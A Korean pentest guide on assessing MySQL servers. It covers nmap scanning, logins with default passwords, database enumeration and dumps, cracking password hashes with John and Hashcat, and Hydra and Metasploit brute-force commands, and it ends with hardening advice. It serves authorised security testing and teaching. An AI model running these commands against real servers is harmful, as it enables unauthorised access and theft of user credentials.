---
sidebar_position: 5
title: MySQL (Port 3306)
---

# MySQL 취약점 진단 (포트 3306)

## 개요

**MySQL**: 오픈소스 관계형 데이터베이스 관리 시스템

**기본 포트**: 3306 (변경 가능)

**주요 버전**:
- MySQL
- MariaDB (MySQL 포크)
- Percona Server

---

## 취약점 진단 체크리스트

### 1. 버전 정보 확인
구버전은 알려진 취약점 존재 가능성

### 2. 원격 접근 제어
- Root 원격 로그인 허용 여부
- 특정 IP만 접근 가능한지 확인

### 3. 기본 계정 및 약한 비밀번호
- `root:(빈 비밀번호)`
- `root:root`
- `root:password`
- `dbadmin:password`
- `admin:admin`

### 4. 데이터 보안
- 저장 데이터 암호화 여부
- 비밀번호 해시 알고리즘
- 민감 정보 평문 저장 여부

---

## 정보 수집

### Nmap 스캔

```bash
# 기본 스캔
nmap -p 3306 -sV <target>

# NSE 스크립트 포함
nmap -p 3306 -sV --script="mysql*" <target>

# 예시
nmap -p 3306 -sV --script="mysql*" 192.168.1.10

# 출력 예시:
# 3306/tcp open  mysql   MySQL 8.1.0
# | mysql-info:
# |   Protocol: 10
# |   Version: 8.1.0
# |   Thread ID: 8
# |   Capabilities flags: 65535
```

### 주요 NSE 스크립트

```bash
# MySQL 정보 수집
nmap -p 3306 --script mysql-info <target>

# 빈 비밀번호 확인
nmap -p 3306 --script mysql-empty-password <target>

# 데이터베이스 열거
nmap -p 3306 --script mysql-databases --script-args="mysqluser=root,mysqlpass=password" <target>

# 사용자 열거
nmap -p 3306 --script mysql-users --script-args="mysqluser=root,mysqlpass=password" <target>
```

---

## MySQL 접속

### 기본 접속

```bash
# 로컬 접속
mysql -u <username> -p

# 원격 접속
mysql -u <username> -p -h <target>

# 포트 지정
mysql -u <username> -p -h <target> -P <port>

# SSL 비활성화
mysql -u <username> -p -h <target> -P <port> --ssl=FALSE

# 예시
mysql -u root -p -h 192.168.1.10 -P 3306 --ssl=FALSE
```

### 접속 테스트

```bash
# Root 빈 비밀번호 테스트
mysql -u root -h <target> -P 3306

# 일반적인 비밀번호 시도
mysql -u root -p'password' -h <target>
mysql -u root -p'root' -h <target>
mysql -u admin -p'admin' -h <target>
```

---

## 데이터베이스 탐색

### 기본 SQL 명령어

```sql
-- 데이터베이스 목록
SHOW DATABASES;

-- 데이터베이스 선택
USE <database_name>;

-- 테이블 목록
SHOW TABLES;

-- 테이블 구조 확인
DESCRIBE <table_name>;
DESC <table_name>;

-- 버전 확인
SELECT VERSION();

-- 현재 사용자
SELECT USER();

-- 모든 데이터 조회
SELECT * FROM <table_name>;

-- 특정 열만 조회
SELECT username, password FROM users;

-- 조건부 조회
SELECT * FROM users WHERE username='admin';

-- 문자열 검색 (대소문자 무시)
SELECT * FROM users WHERE LOWER(username) LIKE '%admin%';

-- 행 개수 확인
SELECT COUNT(*) FROM users;

-- 상위 N개만 조회
SELECT * FROM users LIMIT 10;
```

### 정보 수집 쿼리

```sql
-- 현재 데이터베이스
SELECT DATABASE();

-- 모든 사용자
SELECT user, host FROM mysql.user;

-- 사용자 권한
SHOW GRANTS FOR 'root'@'localhost';

-- 데이터베이스 크기
SELECT table_schema AS "Database",
ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS "Size (MB)"
FROM information_schema.TABLES
GROUP BY table_schema;
```

---

## 데이터베이스 덤프

### Mysqldump

**전체 데이터베이스 덤프**:
```bash
mysqldump -u <user> -p -h <target> -P <port> <database> > dump.sql

# 예시
mysqldump -u root -p -h 192.168.1.10 -P 3306 production > production.sql
```

**특정 테이블 덤프**:
```bash
mysqldump -u <user> -p -h <target> -P <port> <database> <table> > table.sql

# 예시
mysqldump -u root -p -h 192.168.1.10 -P 3306 production users > users.sql
```

**조건부 덤프**:
```bash
# WHERE 절 사용
mysqldump -u root -p -h <target> <database> <table> \
  --where="username LIKE '%admin%'" > admin_users.sql

# 예시
mysqldump -u root -p -h 192.168.1.10 production users \
  --where="role='admin'" > admins.sql
```

**모든 데이터베이스 덤프**:
```bash
mysqldump -u root -p -h <target> --all-databases > all_databases.sql
```

---

## 해시 크래킹

### 해시 추출

덤프 파일에서 해시 추출:

```bash
# INSERT 문에서 비밀번호 열 추출 (3번째 필드)
cat dump.sql | grep "INSERT INTO" | cut -d "'" -f 4 > hashes.txt

# 또는 수동으로 편집
vim dump.sql
# 비밀번호만 추출하여 별도 파일로 저장
```

### 해시 알고리즘 식별

```bash
# Hash-Identifier 사용
hash-identifier

# 해시 입력 프롬프트
HASH: 5f4dcc3b5aa765d61d8327deb882cf99

# 출력:
# Possible Hashs:
# [+] MD5
# [+] Domain Cached Credentials
```

### John the Ripper

```bash
# 기본 크래킹
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 해시 형식 지정 (MD5)
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# 결과 확인
john --show hashes.txt

# 결과를 파일에 저장
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt \
  --pot=cracked.txt hashes.txt
```

### Hashcat

```bash
# MD5 크래킹
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 결과 확인
hashcat -m 0 hashes.txt --show

# GPU 사용 (빠름)
hashcat -m 0 -a 0 -O hashes.txt /usr/share/wordlists/rockyou.txt
```

**주요 해시 타입** (Hashcat -m 값):
- 0: MD5
- 100: SHA1
- 1400: SHA256
- 1000: NTLM
- 3200: bcrypt

---

## 브루트포스 공격

### Hydra

```bash
# 단일 사용자
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>

# 다수 사용자
hydra -L users.txt -P passwords.txt mysql://<target>

# 포트 지정
hydra -l root -P passwords.txt mysql://<target>:3306

# 예시
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10
```

### Metasploit

```bash
msfconsole

use auxiliary/scanner/mysql/mysql_login

set rhosts <target>
set username root
set pass_file /usr/share/wordlists/rockyou.txt

run
```

---

## 덤프 파일 구조 이해

**MySQL 덤프 파일 예시**:
```sql
-- MySQL dump 10.19  Distrib 10.11.4-MariaDB
-- Host: 192.168.1.10    Database: production
-- Server version       8.1.0

-- Table structure for table `users`
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Dumping data for table `users`
LOCK TABLES `users` WRITE;
INSERT INTO `users` VALUES
(1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin@example.com'),
(2,'john','098f6bcd4621d373cade4e832627b4f6','john@example.com'),
(3,'jane','5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8','jane@example.com');
UNLOCK TABLES;
```

---

## 주요 명령어 요약

```bash
# 스캔
nmap -p 3306 -sV --script="mysql*" <target>

# 접속
mysql -u root -p -h <target> -P 3306 --ssl=FALSE

# SQL 명령어
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM table_name;

# 덤프
mysqldump -u root -p -h <target> <database> > dump.sql
mysqldump -u root -p -h <target> <database> <table> > table.sql

# 해시 크래킹
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 브루트포스
hydra -l root -P passwords.txt mysql://<target>
```

## 보안 권장사항

1. ✅ Root 원격 접근 비활성화
2. ✅ 강력한 비밀번호 정책
3. ✅ 최소 권한 원칙
4. ✅ 방화벽으로 외부 접근 제한
5. ✅ SSL/TLS 연결 강제
6. ✅ 정기적인 패치 적용
7. ✅ 민감 데이터 암호화
8. ✅ 강력한 해시 알고리즘 (bcrypt, Argon2)
